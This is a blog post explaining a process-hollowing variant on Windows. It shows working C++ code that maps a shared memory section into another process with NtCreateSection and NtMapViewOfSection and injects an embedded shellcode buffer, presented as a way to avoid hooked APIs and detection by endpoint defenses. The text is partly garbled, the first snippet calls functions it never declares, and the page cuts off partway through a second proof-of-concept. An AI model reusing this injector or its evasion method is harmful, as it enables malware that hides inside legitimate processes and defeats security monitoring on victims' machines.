<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Process Hollowing? not really :: rxOred&#39;s blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="process hollowing without hollowing out the host process" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/" />




<link rel="stylesheet" href="https://rxOred.github.io/assets/style.css">

  <link rel="stylesheet" href="https://rxOred.github.io/assets/red.css">






<link rel="apple-touch-icon" href="https://rxOred.github.io/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://rxOred.github.io/img/favicon1.ico">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Process Hollowing? not really">
<meta property="og:description" content="process hollowing without hollowing out the host process" />
<meta property="og:url" content="https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/" />
<meta property="og:site_name" content="rxOred&#39;s blog" />

  <meta property="og:image" content="https://rxOred.github.io/img/process-hollowing/bound_by_jademerien.jpg">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-01-01 10:21:31 &#43;0000 UTC" />












</head>
<body class="red">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    rxOred&#39;s blog
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/">Process Hollowing? not really</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-01-01
        
      </span>
    
    
    
      <span class="post-reading-time">:: 12 min read (2344 words)</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://rxOred.github.io/tags/malware/">malware</a>&nbsp;
    
    #<a href="https://rxOred.github.io/tags/cpp/">cpp</a>&nbsp;
    
    #<a href="https://rxOred.github.io/tags/windoz/">windoz</a>&nbsp;
    
  </span>
  
  
  <img src="https://rxOred.github.io/img/process-hollowing/bound_by_jademerien.jpg"
    class="post-cover"
    alt="Process Hollowing? not really"
    title="Cover Image" />


  

  <div class="post-content"><div>
        <p><a href="https://www.deviantart.com/jademerien/art/Bound-855334634?comment=1%3A855334634%3A4959164323">(@bound by jademerien)</a></p>
<h1 id="table-of-content">Table of Content<a href="#table-of-content" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ol>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#the-problem">The problem</a></li>
<li><a href="#the-solution">The solution</a>
<ol>
<li><a href="#basics">Basics</a></li>
<li><a href="#implementation">Implementation</a></li>
<li><a href="#achieving-more-stealth">Achieving more stealth</a></li>
</ol>
</li>
<li><a href="#references">References</a></li>
<li><a href="#the-end">The end</a></li>
</ol>
<h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Process hollowing is a code injection / evasion technique that is often
used in malware.</p>
<p>Process hollowing technique works by hollowing out a legitimate process
image and replacing it with malicous code.</p>
<p>A malware that uses process hollowing starts a target **
process with <strong>CREATE_SUSPENDED</strong> flag enabled. Then using the handler it
got from created the process, it <strong>hollows out</strong> the legitimate executable
image from the target process&rsquo;s memory.</p>
<h1 id="the-problem">The problem<a href="#the-problem" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>However, malware tends to use the same set of APIs for this task.
Some of these APIs are,</p>
<pre><code>- CreateProcessA
- WriteProcessMemory
- VirtualProtect
- VirtualAlloc
</code></pre>
<p>And it is very well known that these APIs are often monitored by defense
solutions.</p>
<p>The other major disadvantage is that, when using above APIs for code injection,
malware leaves a lot of memory artifacts which makes it easy for forensic analysts
to indetify the parasite.</p>
<p>For example, in order to do a code injection in windows environment, first one
must allocate enough memory in the target process for the parasite. This alone is
not enough because those alocated memory regions should have <code>executable</code>  (X)
permission. Those regions should also be <code>writable</code> because, otherwise,
<code>WriteProcessMemory</code> or any other API that writes to another process&rsquo;s memory
won&rsquo;t simply work.</p>
<p>Therefore, Having both <code>executable</code> and <code>writable</code> permissions for a memory region
is a strong indication of an infection.</p>
<h1 id="the-solution">The solution<a href="#the-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Well, there are solutions for the 1st problem. For example, one can directly invoke
syscalls without going through <strong>kernel32.dll</strong>.</p>
<p>Of course that&rsquo;s good solution but it wont solve the second issue.</p>
<h2 id="basics">Basics<a href="#basics" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Userland defense solutions mostly operate by hooking common API calls and monitoring
them for malicious content. These common APIs include the ones that malware
often uses for various injection techniques. to name a few,</p>
<pre><code>- OpenProcess / CreateProcess 
- VirtualAlloc
- VirtualProtect
- WriteProcessMemory
</code></pre>
<p>In past, malware authors extensively used <code>VirtualAlloc</code> to inject malicous
code in to a target process. They acheived this buy allocating a memory chunk
of <strong>RWX</strong> permissions, which in fact, became a well know indication of code
injection (Memory artifact).</p>
<p>As a solution to this, malware authors used a combination of VirtualAlloc and
VirtualProtect to inject code into a remote process. First, malware allocates
a memory chunk in the remote process with <strong>RW</strong> permissions using
VirtualAlloc, then it change the permission to <strong>RX</strong> using VirtualProtect.</p>
<p>Although this seem like a victory (since it gets rid off <strong>RWX</strong> sections),
defense solutions began hooking these two calls.</p>
<p>Then malware authors came up with another technique, which uses two APIs
from NTAPI. (well, then defense solutions hooked ntdll but as I previously
mentioned, that&rsquo;s out of scope of this blog post)</p>
<p>In order to understand the technique, one must understand how following
functions from NTAPIs work.</p>
<pre><code>- NtCreateSection
- NtMapViewOfSection
- ZwUnmapViewOfSection
- NtSetContextThread
</code></pre>
<p>For that purpose, we are going to write a small shellcode injector using some
of above functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;ntdll&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> buf[] <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\x31\xc0\x50\xff\x55\x08</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        LARGE_INTEGER sectionSize <span style="color:#f92672">=</span> { <span style="color:#66d9ef">sizeof</span> buf };
</span></span><span style="display:flex;"><span>        HANDLE sectionHandle <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>        PVOID localSectionAddress <span style="color:#f92672">=</span> NULL, remoteSectionAddress <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create a read write execute memory region in the local process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (fNtCreateSection(
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>sectionHandle, 
</span></span><span style="display:flex;"><span>                SECTION_ALL_ACCESS, 
</span></span><span style="display:flex;"><span>                NULL,
</span></span><span style="display:flex;"><span>                (PLARGE_INTEGER)<span style="color:#f92672">&amp;</span>sectionSize, 
</span></span><span style="display:flex;"><span>                PAGE_EXECUTE_READWRITE, 
</span></span><span style="display:flex;"><span>                SEC_COMMIT, NULL) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create section failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        SIZE_T size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span> buf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create a view of the memory section in the local process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>                sectionHandle, 
</span></span><span style="display:flex;"><span>                GetCurrentProcess(), 
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>localSectionAddress, 
</span></span><span style="display:flex;"><span>                NULL, NULL, NULL, 
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>size, <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>                PAGE_READWRITE) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create map failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HANDLE processHandle <span style="color:#f92672">=</span> OpenProcess(
</span></span><span style="display:flex;"><span>                PROCESS_ALL_ACCESS, 
</span></span><span style="display:flex;"><span>                FALSE, 
</span></span><span style="display:flex;"><span>                DWORD(atoi(argv[<span style="color:#ae81ff">1</span>])));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (processHandle <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x] Open process failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }  
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create a map view of the section in the target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (fNtMapViewOfSection(
</span></span><span style="display:flex;"><span>                sectionHandle, 
</span></span><span style="display:flex;"><span>                processHandle, 
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>remoteSectionAddress, 
</span></span><span style="display:flex;"><span>                NULL, NULL, NULL,
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>size, <span style="color:#ae81ff">2</span>, NULL, 
</span></span><span style="display:flex;"><span>                PAGE_EXECUTE_READ) <span style="color:#f92672">!=</span> STATUS_SUCCESS)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[x]Create map failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;remote section created&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        memcpy(localSectionAddress, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Shellcode injected at 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> remoteSectionAddress <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        CloseHandle(sectionHandle);
</span></span><span style="display:flex;"><span>        HANDLE targetThreadHandle <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>        fRtlCreateUserThread(
</span></span><span style="display:flex;"><span>                processHandle, 
</span></span><span style="display:flex;"><span>                NULL, 
</span></span><span style="display:flex;"><span>                FALSE, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, 
</span></span><span style="display:flex;"><span>                remoteSectionAddress, 
</span></span><span style="display:flex;"><span>                NULL, 
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>targetThreadHandle, NULL
</span></span><span style="display:flex;"><span>            );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;./whatever.exe &lt;pid&gt;&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>NtCreateSection</code> function creates a shared section of memory that two or
more processes can read from and write into. The function expects ** address of an uninitalized section handle. This section handle is initialized
by the function and will be used when referencing to that specific section</p>
<p><code>NtMapViewOfSection</code> is the function that uses initliazed section handle
return as the output parameter of <strong>NtCreateSection</strong>. The function creates
a mapping of the section referenced with <strong>section handle</strong> in the process
user specifies.</p>
<p>In the above snippet, <code>NtCreateSection</code> is used to createe a section with
permissions <code>PAGE_EXECUTE_READWRITE</code> of size <code>sizeof buf</code>.</p>
<p>then two calls to <code>NtMapViewOfSection</code> are used to map the section into
local process and the remote process. Permissions for the mapping of
local process is <code>PAGE_READWRITE</code> while permissions for the remote
process &rsquo;s mapping is <code>PAGE_EXECUTE_READ</code>.</p>
<p>This clearly shows the advantage of NtCreateSection + NtMapViewOfSection
over many other process injection techniques. Since memory is allocated
in the target process with permissions of <code>PAGE_EXECUTE_READ</code>, calls to
<code>VirtualAlloc</code> wont be required. This also helps against some EDR
solutions</p>
<p>shellcode started crashing).</p>
<p>here&rsquo;s the result.</p>
<p><img src="/img/process-hollowing/1.png" alt="remove this"></p>
<p><img src="/img/process-hollowing/msgbox1.png" alt="notepad messagebox"></p>
<p>mapped section in remote process</p>
<p><img src="/img/process-hollowing/permissions1.png" alt="remove this"></p>
<p>Now the APIs are understood, it is time to demonstrate the process
hollowing technique using above code injection technique.</p>
<h2 id="implementation">Implementation<a href="#implementation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Before implementing it is essential to undersand what can be done and what
we are going to do with the above injection technique.</p>
<p>Since this post is about process hollowing, anyone can guess we are going
to hollow out the target process image and inject a shellcode using the
above technique, but simply put, no.</p>
<p>The steps can be briefly described as follow.</p>
<pre><code>- Injecting the shellcode into target process
- Retrieve ImageBaseAddress of the executable image
- Read executable image of the remote process into a buffer
- Unmap executable image from the process 
- Hook somewhere of the copied image so it will jump to shellcode
- Remap the section into the remote process using above techniques
</code></pre>
<p>Here is the PoC code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;ntdll&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define SECTION_SIZE 0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    HRSRC shellcodeResource;
</span></span><span style="display:flex;"><span>    SIZE_T shellcodeSize;
</span></span><span style="display:flex;"><span>    BYTE<span style="color:#f92672">*</span> shellcode;
</span></span><span style="display:flex;"><span>} SHELLCODE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    HANDLE processHandle;
</span></span><span style="display:flex;"><span>    DWORD imageBaseAddress;
</span></span><span style="display:flex;"><span>    DWORD entryPoint;
</span></span><span style="display:flex;"><span>} HOST;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if !defined NTSTATUS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> LONG NTSTATUS;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STATUS_SUCCESS 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> CLIENT_ID<span style="color:#f92672">*</span> PCLIENT_ID;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> myNtCreateSection <span style="color:#f92672">=</span> NTSTATUS(NTAPI<span style="color:#f92672">*</span>)(
</span></span><span style="display:flex;"><span>    OUT PHANDLE SectionHandle,
</span></span><span style="display:flex;"><span>    IN ULONG DesiredAccess,
</span></span><span style="display:flex;"><span>    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
</span></span><span style="display:flex;"><span>    IN PLARGE_INTEGER MaximumSize OPTIONAL,
</span></span><span style="display:flex;"><span>    IN ULONG PageAttributess,
</span></span><span style="display:flex;"><span>    IN ULONG SectionAttributes,
</span></span><span style="display:flex;"><span>    IN HANDLE FileHandle OPTIONAL
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> myNtMapViewOfSection <span style="color:#f92672">=</span> NTSTATUS(NTAPI<span style="color:#f92672">*</span>)(
</span></span><span style="display:flex;"><span>    HANDLE SectionHandle,
</span></span><span style="display:flex;"><span>    HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span>    PVOID<span style="color:#f92672">*</span> BaseAddress,
</span></span><span style="display:flex;"><span>    ULONG_PTR ZeroBits,
</span></span><span style="display:flex;"><span>    SIZE_T CommitSize,
</span></span><span style="display:flex;"><span>    PLARGE_INTEGER SectionOffset,
</span></span><span style="display:flex;"><span>    PSIZE_T ViewSize,
</span></span><span style="display:flex;"><span>    DWORD InheritDisposition,
</span></span><span style="display:flex;"><span>    ULONG AllocationType,
</span></span><span style="display:flex;"><span>    ULONG Win32Protect
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> myZwUnmapViewOfSection <span style="color:#f92672">=</span> NTSTATUS(NTAPI<span style="color:#f92672">*</span>)(
</span></span><span style="display:flex;"><span>    IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span>    IN PVOID BaseAddress
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> myNtGetContextThread <span style="color:#f92672">=</span> NTSTATUS(NTAPI<span style="color:#f92672">*</span>) (
</span></span><span style="display:flex;"><span>    IN HANDLE ThreadHandle,
</span></span><span style="display:flex;"><span>    OUT PCONTEXT Context
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> myNtSetContextThread <span style="color:#f92672">=</span> NTSTATUS(NTAPI<span style="color:#f92672">*</span>) (
</span></span><span style="display:flex;"><span>    IN HANDLE ThreadHandle,
</span></span><span style="display:flex;"><span>    IN PCONTEXT Context
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>myNtCreateSection fNtCreateSection <span style="color:#f92672">=</span> (myNtCreateSection)(GetProcAddress(
</span></span><span style="display:flex;"><span>    GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NtCreateSection&#34;</span>));
</span></span><span style="display:flex;"><span>myNtMapViewOfSection fNtMapViewOfSection <span style="color:#f92672">=</span> (myNtMapViewOfSection)(GetProcAddress(
</span></span><span style="display:flex;"><span>    GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NtMapViewOfSection&#34;</span>));
</span></span><span style="display:flex;"><span>myZwUnmapViewOfSection fZwUnmapViewOfSection <span style="color:#f92672">=</span> (myZwUnmapViewOfSection)(GetProcAddress(
</span></span><span style="display:flex;"><span>    GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ZwUnmapViewOfSection&#34;</span>));
</span></span><span style="display:flex;"><span>myNtGetContextThread fNtGetContextThread <span style="color:#f92672">=</span> (myNtGetContextThread)(GetProcAddress(
</span></span><span style="display:flex;"><span>    GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NtGetContextThread&#34;</span>));
</span></span><span style="display:flex;"><span>myNtSetContextThread fNtSetContextThread <span style="color:#f92672">=</span> (myNtSetContextThread)(GetProcAddress(
</span></span><span style="display:flex;"><span>    GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;NtSetContextThread&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GetSizeOfImage</span>(BYTE<span style="color:#f92672">*</span> processImage)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    IMAGE_DOS_HEADER<span style="color:#f92672">*</span> dosHeader <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    IMAGE_NT_HEADERS<span style="color:#f92672">*</span> ntHeaders <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dosHeader <span style="color:#f92672">=</span> (IMAGE_DOS_HEADER<span style="color:#f92672">*</span>)processImage;
</span></span><span style="display:flex;"><span>    ntHeaders <span style="color:#f92672">=</span> (IMAGE_NT_HEADERS<span style="color:#f92672">*</span>)((BYTE<span style="color:#f92672">*</span>)processImage <span style="color:#f92672">+</span> dosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ntHeaders<span style="color:#f92672">-&gt;</span>OptionalHeader.SizeOfImage;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
